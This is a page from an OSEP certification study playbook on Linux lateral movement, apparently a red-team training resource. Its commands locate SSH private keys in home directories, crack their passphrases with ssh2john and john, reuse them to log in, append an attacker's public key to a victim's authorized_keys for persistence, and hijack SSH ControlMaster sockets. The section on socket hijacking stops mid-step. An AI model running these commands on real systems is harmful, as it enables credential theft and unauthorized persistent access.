<!doctype html>
<html lang="en" dir="ltr" class="docs-wrapper plugin-docs plugin-id-default docs-version-current docs-doc-page docs-doc-id-osep/Linux/Lateral Movement" data-has-hydrated="false">
<head>
<meta charset="UTF-8">
<meta name="generator" content="Docusaurus v3.9.2">
<title data-rh="true">Lateral Movement | OSEP Playbook</title><meta data-rh="true" name="viewport" content="width=device-width,initial-scale=1"><meta data-rh="true" name="twitter:card" content="summary_large_image"><meta data-rh="true" property="og:url" content="https://hkrsanjeet.github.io/OSEP-Playbook/docs/osep/Linux/Lateral Movement"><meta data-rh="true" property="og:locale" content="en"><meta data-rh="true" name="docusaurus_locale" content="en"><meta data-rh="true" name="docsearch:language" content="en"><meta data-rh="true" name="docusaurus_version" content="current"><meta data-rh="true" name="docusaurus_tag" content="docs-default-current"><meta data-rh="true" name="docsearch:version" content="current"><meta data-rh="true" name="docsearch:docusaurus_tag" content="docs-default-current"><meta data-rh="true" property="og:title" content="Lateral Movement | OSEP Playbook"><meta data-rh="true" name="description" content="Lateral Movement"><meta data-rh="true" property="og:description" content="Lateral Movement"><link data-rh="true" rel="icon" href="/OSEP-Playbook/img/favicon.ico"><link data-rh="true" rel="canonical" href="https://hkrsanjeet.github.io/OSEP-Playbook/docs/osep/Linux/Lateral Movement"><link data-rh="true" rel="alternate" href="https://hkrsanjeet.github.io/OSEP-Playbook/docs/osep/Linux/Lateral Movement" hreflang="en"><link data-rh="true" rel="alternate" href="https://hkrsanjeet.github.io/OSEP-Playbook/docs/osep/Linux/Lateral Movement" hreflang="x-default"><script data-rh="true" type="application/ld+json">{"@context":"https://schema.org","@type":"BreadcrumbList","itemListElement":[{"@type":"ListItem","position":1,"name":"Lateral Movement","item":"https://hkrsanjeet.github.io/OSEP-Playbook/docs/osep/Linux/Lateral Movement"}]}</script><link rel="stylesheet" href="/OSEP-Playbook/assets/css/styles.07dfdec4.css">
<script src="/OSEP-Playbook/assets/js/runtime~main.8d70029c.js" defer="defer"></script>
<script src="/OSEP-Playbook/assets/js/main.a9b7b218.js" defer="defer"></script>
</head>
<body class="navigation-with-keyboard">
<svg style="display: none;"><defs>
<symbol id="theme-svg-external-link" viewBox="0 0 24 24"><path fill="currentColor" d="M21 13v10h-21v-19h12v2h-10v15h17v-8h2zm3-12h-10.988l4.035 4-6.977 7.07 2.828 2.828 6.977-7.07 4.125 4.172v-11z"/></symbol>
</defs></svg>
<script>!function(){var t=function(){try{return new URLSearchParams(window.location.search).get("docusaurus-theme")}catch(t){}}()||function(){try{return window.localStorage.getItem("theme")}catch(t){}}();document.documentElement.setAttribute("data-theme",t||"light"),document.documentElement.setAttribute("data-theme-choice",t||"light")}(),function(){try{const c=new URLSearchParams(window.location.search).entries();for(var[t,e]of c)if(t.startsWith("docusaurus-data-")){var a=t.replace("docusaurus-data-","data-");document.documentElement.setAttribute(a,e)}}catch(t){}}()</script><div id="__docusaurus"><div role="region" aria-label="Skip to main content"><a class="skipToContent_fXgn" href="#__docusaurus_skipToContent_fallback">Skip to main content</a></div><nav aria-label="Main" class="theme-layout-navbar navbar navbar--fixed-top"><div class="navbar__inner"><div class="theme-layout-navbar-left navbar__items"><button aria-label="Toggle navigation bar" aria-expanded="false" class="navbar__toggle clean-btn" type="button"><svg width="30" height="30" viewBox="0 0 30 30" aria-hidden="true"><path stroke="currentColor" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2" d="M4 7h22M4 15h22M4 23h22"></path></svg></button><a class="navbar__brand" href="/OSEP-Playbook/"><b class="navbar__title text--truncate">OSEP-PLAYBOOK</b></a><a aria-current="page" class="navbar__item navbar__link navbar__link--active" href="/OSEP-Playbook/docs/osep/scanning/external-nmap">Docs</a></div><div class="theme-layout-navbar-right navbar__items navbar__items--right"><div class="navbarSearchContainer_Bca1"><div class="navbar__search searchBarContainer_NW3z" dir="ltr"><input placeholder="Search" aria-label="Search" class="navbar__search-input searchInput_YFbd" value=""><div class="loadingRing_RJI3 searchBarLoadingRing_YnHq"><div></div><div></div><div></div><div></div></div></div></div><a href="https://github.com/hkrsanjeet/OSEP-Playbook" target="_blank" rel="noopener noreferrer" class="navbar__item navbar__link">GitHub<svg width="13.5" height="13.5" aria-label="(opens in new tab)" class="iconExternalLink_nPIU"><use href="#theme-svg-external-link"></use></svg></a><div class="toggle_vylO colorModeToggle_DEke"><button class="clean-btn toggleButton_gllP toggleButtonDisabled_aARS" type="button" disabled="" title="system mode" aria-label="Switch between dark and light mode (currently system mode)"><svg viewBox="0 0 24 24" width="24" height="24" aria-hidden="true" class="toggleIcon_g3eP lightToggleIcon_pyhR"><path fill="currentColor" d="M12,9c1.65,0,3,1.35,3,3s-1.35,3-3,3s-3-1.35-3-3S10.35,9,12,9 M12,7c-2.76,0-5,2.24-5,5s2.24,5,5,5s5-2.24,5-5 S14.76,7,12,7L12,7z M2,13l2,0c0.55,0,1-0.45,1-1s-0.45-1-1-1l-2,0c-0.55,0-1,0.45-1,1S1.45,13,2,13z M20,13l2,0c0.55,0,1-0.45,1-1 s-0.45-1-1-1l-2,0c-0.55,0-1,0.45-1,1S19.45,13,20,13z M11,2v2c0,0.55,0.45,1,1,1s1-0.45,1-1V2c0-0.55-0.45-1-1-1S11,1.45,11,2z M11,20v2c0,0.55,0.45,1,1,1s1-0.45,1-1v-2c0-0.55-0.45-1-1-1C11.45,19,11,19.45,11,20z M5.99,4.58c-0.39-0.39-1.03-0.39-1.41,0 c-0.39,0.39-0.39,1.03,0,1.41l1.06,1.06c0.39,0.39,1.03,0.39,1.41,0s0.39-1.03,0-1.41L5.99,4.58z M18.36,16.95 c-0.39-0.39-1.03-0.39-1.41,0c-0.39,0.39-0.39,1.03,0,1.41l1.06,1.06c0.39,0.39,1.03,0.39,1.41,0c0.39-0.39,0.39-1.03,0-1.41 L18.36,16.95z M19.42,5.99c0.39-0.39,0.39-1.03,0-1.41c-0.39-0.39-1.03-0.39-1.41,0l-1.06,1.06c-0.39,0.39-0.39,1.03,0,1.41 s1.03,0.39,1.41,0L19.42,5.99z M7.05,18.36c0.39-0.39,0.39-1.03,0-1.41c-0.39-0.39-1.03-0.39-1.41,0l-1.06,1.06 c-0.39,0.39-0.39,1.03,0,1.41s1.03,0.39,1.41,0L7.05,18.36z"></path></svg><svg viewBox="0 0 24 24" width="24" height="24" aria-hidden="true" class="toggleIcon_g3eP darkToggleIcon_wfgR"><path fill="currentColor" d="M9.37,5.51C9.19,6.15,9.1,6.82,9.1,7.5c0,4.08,3.32,7.4,7.4,7.4c0.68,0,1.35-0.09,1.99-0.27C17.45,17.19,14.93,19,12,19 c-3.86,0-7-3.14-7-7C5,9.07,6.81,6.55,9.37,5.51z M12,3c-4.97,0-9,4.03-9,9s4.03,9,9,9s9-4.03,9-9c0-0.46-0.04-0.92-0.1-1.36 c-0.98,1.37-2.58,2.26-4.4,2.26c-2.98,0-5.4-2.42-5.4-5.4c0-1.81,0.89-3.42,2.26-4.4C12.92,3.04,12.46,3,12,3L12,3z"></path></svg><svg viewBox="0 0 24 24" width="24" height="24" aria-hidden="true" class="toggleIcon_g3eP systemToggleIcon_QzmC"><path fill="currentColor" d="m12 21c4.971 0 9-4.029 9-9s-4.029-9-9-9-9 4.029-9 9 4.029 9 9 9zm4.95-13.95c1.313 1.313 2.05 3.093 2.05 4.95s-0.738 3.637-2.05 4.95c-1.313 1.313-3.093 2.05-4.95 2.05v-14c1.857 0 3.637 0.737 4.95 2.05z"></path></svg></button></div></div></div><div role="presentation" class="navbar-sidebar__backdrop"></div></nav><div id="__docusaurus_skipToContent_fallback" class="theme-layout-main main-wrapper mainWrapper_z2l0"><div class="docsWrapper_hBAB"><button aria-label="Scroll back to top" class="clean-btn theme-back-to-top-button backToTopButton_sjWU" type="button"></button><div class="docRoot_UBD9"><aside class="theme-doc-sidebar-container docSidebarContainer_YfHR"><div class="sidebarViewport_aRkj"><div class="sidebar_njMd"><nav aria-label="Docs sidebar" class="menu thin-scrollbar menu_SIkG"><ul class="theme-doc-sidebar-menu menu__list"><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-1 menu__list-item"><div class="menu__list-item-collapsible"><a class="categoryLink_byQd menu__link menu__link--sublist menu__link--sublist-caret menu__link--active" role="button" aria-expanded="true" href="/OSEP-Playbook/docs/osep/scanning/external-nmap"><span title="OSEP" class="categoryLinkLabel_W154">OSEP</span></a></div><ul class="menu__list"><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-2 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="categoryLink_byQd menu__link menu__link--sublist menu__link--sublist-caret" role="button" aria-expanded="false" tabindex="0" href="/OSEP-Playbook/docs/osep/scanning/external-nmap"><span title="Scanning" class="categoryLinkLabel_W154">Scanning</span></a></div></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-2 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="categoryLink_byQd menu__link menu__link--sublist menu__link--sublist-caret" role="button" aria-expanded="false" tabindex="0" href="/OSEP-Playbook/docs/osep/initial-access/phishing/send-emails"><span title="Initial &amp; Further Access" class="categoryLinkLabel_W154">Initial &amp; Further Access</span></a></div></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-2 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="categoryLink_byQd menu__link menu__link--sublist menu__link--sublist-caret" role="button" aria-expanded="false" tabindex="0" href="/OSEP-Playbook/docs/osep/Tunneling/Ligolo-ng"><span title="Tunneling" class="categoryLinkLabel_W154">Tunneling</span></a></div></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-2 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="categoryLink_byQd menu__link menu__link--sublist menu__link--sublist-caret" role="button" aria-expanded="false" tabindex="0" href="/OSEP-Playbook/docs/osep/Privilege Escalation/Access Tokens - SeImpersonate"><span title="Privilege Esclation" class="categoryLinkLabel_W154">Privilege Esclation</span></a></div></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-2 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="categoryLink_byQd menu__link menu__link--sublist menu__link--sublist-caret" role="button" aria-expanded="false" tabindex="0" href="/OSEP-Playbook/docs/osep/Defense Evasion/Disable AMSI"><span title="Defense Evasion" class="categoryLinkLabel_W154">Defense Evasion</span></a></div></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-2 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="categoryLink_byQd menu__link menu__link--sublist menu__link--sublist-caret" role="button" aria-expanded="false" tabindex="0" href="/OSEP-Playbook/docs/osep/Credentials/Cracking Hashes"><span title="Credentials" class="categoryLinkLabel_W154">Credentials</span></a></div></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-2 menu__list-item"><div class="menu__list-item-collapsible"><a class="categoryLink_byQd menu__link menu__link--sublist menu__link--sublist-caret menu__link--active" role="button" aria-expanded="true" tabindex="0" href="/OSEP-Playbook/docs/osep/Linux/Initial Access"><span title="Linux" class="categoryLinkLabel_W154">Linux</span></a></div><ul class="menu__list"><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-3 menu__list-item"><a class="menu__link" tabindex="0" href="/OSEP-Playbook/docs/osep/Linux/Initial Access"><span title="Initial Access" class="linkLabel_WmDU">Initial Access</span></a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-3 menu__list-item"><a class="menu__link menu__link--active" aria-current="page" tabindex="0" href="/OSEP-Playbook/docs/osep/Linux/Lateral Movement"><span title="Lateral Movement" class="linkLabel_WmDU">Lateral Movement</span></a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-3 menu__list-item"><a class="menu__link" tabindex="0" href="/OSEP-Playbook/docs/osep/Linux/Payloads"><span title="Payloads" class="linkLabel_WmDU">Payloads</span></a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-3 menu__list-item"><a class="menu__link" tabindex="0" href="/OSEP-Playbook/docs/osep/Linux/Privilege Escalation"><span title="Privilege Escalation" class="linkLabel_WmDU">Privilege Escalation</span></a></li></ul></li></ul></li></ul></nav></div></div></aside><main class="docMainContainer_TBSr"><div class="container padding-top--md padding-bottom--lg"><div class="row"><div class="col docItemCol_VOVn"><div class="docItemContainer_Djhp"><article><nav class="theme-doc-breadcrumbs breadcrumbsContainer_Z_bl" aria-label="Breadcrumbs"><ul class="breadcrumbs"><li class="breadcrumbs__item"><a aria-label="Home page" class="breadcrumbs__link" href="/OSEP-Playbook/"><svg viewBox="0 0 24 24" class="breadcrumbHomeIcon_YNFT"><path d="M10 19v-5h4v5c0 .55.45 1 1 1h3c.55 0 1-.45 1-1v-7h1.7c.46 0 .68-.57.33-.87L12.67 3.6c-.38-.34-.96-.34-1.34 0l-8.36 7.53c-.34.3-.13.87.33.87H5v7c0 .55.45 1 1 1h3c.55 0 1-.45 1-1z" fill="currentColor"></path></svg></a></li><li class="breadcrumbs__item"><span class="breadcrumbs__link">OSEP</span></li><li class="breadcrumbs__item"><span class="breadcrumbs__link">Linux</span></li><li class="breadcrumbs__item breadcrumbs__item--active"><span class="breadcrumbs__link">Lateral Movement</span></li></ul></nav><div class="tocCollapsible_ETCw theme-doc-toc-mobile tocMobile_ITEo"><button type="button" class="clean-btn tocCollapsibleButton_TO0P">On this page</button></div><div class="theme-doc-markdown markdown"><header><h1>Lateral Movement</h1></header><h3 class="anchor anchorTargetStickyNavbar_Vzrq" id="lateral-movement"><strong>Lateral Movement</strong><a href="#lateral-movement" class="hash-link" aria-label="Direct link to lateral-movement" title="Direct link to lateral-movement" translate="no">​</a></h3>
<h3 class="anchor anchorTargetStickyNavbar_Vzrq" id="configuration-files"><strong>Configuration Files</strong><a href="#configuration-files" class="hash-link" aria-label="Direct link to configuration-files" title="Direct link to configuration-files" translate="no">​</a></h3>
<p><strong>Check the dot hidden files</strong>, usually we could find private keys for SSH keys or hardcoded credentials, or indications on how the system works, potential important folders or scripts and much more.</p>
<ul>
<li class=""><code>.bashrc</code></li>
<li class=""><code>.bash_profile</code></li>
<li class=""><code>.mysql_history</code></li>
<li class=""><code>.ssh</code></li>
<li class="">Any other relevant file you may find</li>
</ul>
<h3 class="anchor anchorTargetStickyNavbar_Vzrq" id="ssh"><strong>SSH</strong><a href="#ssh" class="hash-link" aria-label="Direct link to ssh" title="Direct link to ssh" translate="no">​</a></h3>
<h3 class="anchor anchorTargetStickyNavbar_Vzrq" id="ssh-keys"><strong>SSH Keys</strong><a href="#ssh-keys" class="hash-link" aria-label="Direct link to ssh-keys" title="Direct link to ssh-keys" translate="no">​</a></h3>
<p><strong>Find Private Keys</strong></p>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token function" style="color:#d73a49">find</span><span class="token plain"> /home/ </span><span class="token parameter variable" style="color:#36acaa">-name</span><span class="token plain"> </span><span class="token string" style="color:#e3116c">&quot;id_rsa&quot;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">/home/offsec/.ssh/id_rsa</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">find: ‘/home/linuxvictim/.ssh</span><span class="token string" style="color:#e3116c">&#x27;: Permission denied</span><br></span><span class="token-line" style="color:#393A34"><span class="token string" style="color:#e3116c">...</span><br></span><span class="token-line" style="color:#393A34"><span class="token string" style="color:#e3116c">find: ‘/home/ansibleadm/.gnupg&#x27;</span><span class="token builtin class-name">:</span><span class="token plain"> Permission denied</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">find: ‘/home/ansibleadm/.local/share&#x27;: Permission denied</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span></code></pre></div></div>
<p><strong>Download Private Keys</strong></p>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token comment" style="color:#999988;font-style:italic"># Copy contents to local computer</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token function" style="color:#d73a49">cat</span><span class="token plain"> id_rsa</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token function" style="color:#d73a49">cat</span><span class="token plain"> known_hosts</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span></code></pre></div></div>
<p><strong>Cracking Private Keys Passphrase</strong></p>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token comment" style="color:#999988;font-style:italic"># Extract the key</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">ssh2john </span><span class="token punctuation" style="color:#393A34">[</span><span class="token plain">ID_RSA</span><span class="token punctuation" style="color:#393A34">]</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">&gt;</span><span class="token plain"> ssh.hash</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">ssh2john </span><span class="token punctuation" style="color:#393A34">[</span><span class="token plain">USER_KEY</span><span class="token punctuation" style="color:#393A34">]</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">&gt;</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">[</span><span class="token plain">USER_KEY</span><span class="token punctuation" style="color:#393A34">]</span><span class="token plain">_hash.txt</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">ssh2john svuser.key </span><span class="token operator" style="color:#393A34">&gt;</span><span class="token plain"> svuser.hash</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token comment" style="color:#999988;font-style:italic"># Crack it</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token function" style="color:#d73a49">sudo</span><span class="token plain"> john </span><span class="token parameter variable" style="color:#36acaa">--wordlist</span><span class="token operator" style="color:#393A34">=</span><span class="token plain">/usr/share/wordlists/rockyou.txt ./</span><span class="token punctuation" style="color:#393A34">[</span><span class="token plain">USER_KEY</span><span class="token punctuation" style="color:#393A34">]</span><span class="token plain">_hash.txt</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span></code></pre></div></div>
<p><strong>Use Private Keys to Connect</strong></p>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token function" style="color:#d73a49">ssh</span><span class="token plain"> </span><span class="token parameter variable" style="color:#36acaa">-i</span><span class="token plain"> ./svuser.key svuser@</span><span class="token punctuation" style="color:#393A34">[</span><span class="token plain">TARGET_SERVER</span><span class="token punctuation" style="color:#393A34">]</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span></code></pre></div></div>
<h3 class="anchor anchorTargetStickyNavbar_Vzrq" id="ssh-persistence"><strong>SSH Persistence</strong><a href="#ssh-persistence" class="hash-link" aria-label="Direct link to ssh-persistence" title="Direct link to ssh-persistence" translate="no">​</a></h3>
<p><strong>Generate SSH Keypair</strong> If we accept the default values for the file path, it will create a pair of files in our <strong>~/.ssh/directory</strong>. We will get <strong>id_rsa</strong> for the private key and <strong>id_rsa.pub</strong> for the public key. We can then <strong>cat</strong> the contents of <strong>id_rsa.pub</strong> and copy it to the clipboard.</p>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token comment" style="color:#999988;font-style:italic"># On your Kali</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">ssh-keygen</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Generating public/private rsa key pair.</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Enter </span><span class="token function" style="color:#d73a49">file</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">in</span><span class="token plain"> </span><span class="token function" style="color:#d73a49">which</span><span class="token plain"> to save the key </span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">/home/kali/.ssh/id_rsa</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain">:</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Enter passphrase </span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">empty </span><span class="token keyword" style="color:#00009f">for</span><span class="token plain"> no passphrase</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain">:</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Enter same passphrase again:</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Your identification has been saved </span><span class="token keyword" style="color:#00009f">in</span><span class="token plain"> /home/kali/.ssh/id_rsa.</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Your public key has been saved </span><span class="token keyword" style="color:#00009f">in</span><span class="token plain"> /home/kali/.ssh/id_rsa.pub.</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">The key fingerprint is:</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">SHA256:VTLfYd2shCqYOTkpZqeHRrqxnKjyVViNgbmVMpKyEug root@kali</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">The key&#x27;s randomart image is:</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">+---</span><span class="token punctuation" style="color:#393A34">[</span><span class="token plain">RSA </span><span class="token number" style="color:#36acaa">2048</span><span class="token punctuation" style="color:#393A34">]</span><span class="token plain">----+</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token operator" style="color:#393A34">|</span><span class="token builtin class-name">.</span><span class="token plain">  </span><span class="token builtin class-name">.</span><span class="token plain"> o</span><span class="token punctuation" style="color:#393A34">..</span><span class="token plain">  o </span><span class="token punctuation" style="color:#393A34">..</span><span class="token plain">oo.</span><span class="token operator" style="color:#393A34">|</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token operator" style="color:#393A34">|</span><span class="token plain">+ o </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> o+   </span><span class="token operator" style="color:#393A34">=</span><span class="token plain">.o</span><span class="token punctuation" style="color:#393A34">..</span><span class="token plain">+</span><span class="token operator" style="color:#393A34">|</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token operator" style="color:#393A34">|</span><span class="token plain">.+ </span><span class="token builtin class-name">.</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">=</span><span class="token plain">o*. </span><span class="token punctuation" style="color:#393A34">..</span><span class="token punctuation" style="color:#393A34">..</span><span class="token punctuation" style="color:#393A34">..</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">|</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token operator" style="color:#393A34">|</span><span class="token plain">oE  *oX </span><span class="token punctuation" style="color:#393A34">..</span><span class="token plain">.   </span><span class="token builtin class-name">.</span><span class="token plain">  </span><span class="token operator" style="color:#393A34">|</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token operator" style="color:#393A34">|</span><span class="token builtin class-name">.</span><span class="token plain">  </span><span class="token operator" style="color:#393A34">=</span><span class="token plain">.</span><span class="token operator" style="color:#393A34">=</span><span class="token plain">.oS.       </span><span class="token operator" style="color:#393A34">|</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token operator" style="color:#393A34">|</span><span class="token plain">  o +</span><span class="token punctuation" style="color:#393A34">..</span><span class="token plain">          </span><span class="token operator" style="color:#393A34">|</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token operator" style="color:#393A34">|</span><span class="token plain"> o *</span><span class="token punctuation" style="color:#393A34">..</span><span class="token plain">           </span><span class="token operator" style="color:#393A34">|</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token operator" style="color:#393A34">|</span><span class="token plain">o </span><span class="token operator" style="color:#393A34">=</span><span class="token plain">.             </span><span class="token operator" style="color:#393A34">|</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token operator" style="color:#393A34">|</span><span class="token plain">+</span><span class="token punctuation" style="color:#393A34">..</span><span class="token plain">              </span><span class="token operator" style="color:#393A34">|</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">+----</span><span class="token punctuation" style="color:#393A34">[</span><span class="token plain">SHA256</span><span class="token punctuation" style="color:#393A34">]</span><span class="token plain">-----+</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span></code></pre></div></div>
<p><strong>Insert Public Key</strong> in the victim&#x27;s user folder</p>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token comment" style="color:#999988;font-style:italic"># For example if our target is /home/emma/</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token builtin class-name">echo</span><span class="token plain"> </span><span class="token string" style="color:#e3116c">&quot;ssh-rsa AAAAB3NzaC1yc2E....ANSzp9EPhk4cIeX8= kali@kali&quot;</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">&gt;&gt;</span><span class="token plain"> /home/emma/.ssh/authorized_keys</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span></code></pre></div></div>
<p><strong>Connect to the Victim</strong></p>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token function" style="color:#d73a49">ssh</span><span class="token plain"> emma@</span><span class="token punctuation" style="color:#393A34">[</span><span class="token plain">TARGET_SERVER</span><span class="token punctuation" style="color:#393A34">]</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span></code></pre></div></div>
<h3 class="anchor anchorTargetStickyNavbar_Vzrq" id="ssh-hijacking-with-controlmaster"><strong>SSH Hijacking with ControlMaster</strong><a href="#ssh-hijacking-with-controlmaster" class="hash-link" aria-label="Direct link to ssh-hijacking-with-controlmaster" title="Direct link to ssh-hijacking-with-controlmaster" translate="no">​</a></h3>
<p><strong>Theory</strong> SSH hijacking is a lateral movement technique that abuses existing SSH sessions, similar to RDP hijacking in Windows. Attackers often leverage the <strong>ControlMaster</strong> feature or the <strong>ssh-agent</strong> to reuse active connections without re-entering credentials. By creating or modifying a user&#x27;s <code>~/.ssh/config</code> file, ControlMaster can be enabled so that multiple sessions share the same socket, which remains open for a set time (<code>ControlPersist</code>) or indefinitely. If an attacker gains shell access or write permissions to a user&#x27;s home directory, they can hijack active SSH connections to pivot into downstream systems. This is especially useful in red team scenarios where stealth and avoiding credential theft are priorities.</p>
<p><strong>Steps</strong> A --&gt; B: a has a session on B, piggybacking A&#x27;s access to B</p>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token comment" style="color:#999988;font-style:italic"># Check files</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">~/.ssh/config</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">or</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">/etc/ssh/ssh_config</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span></code></pre></div></div>
<p>Any socket file like <code>kevin@web03:22</code> in <code>/home/kevin/.ssh/controlmaster</code></p>
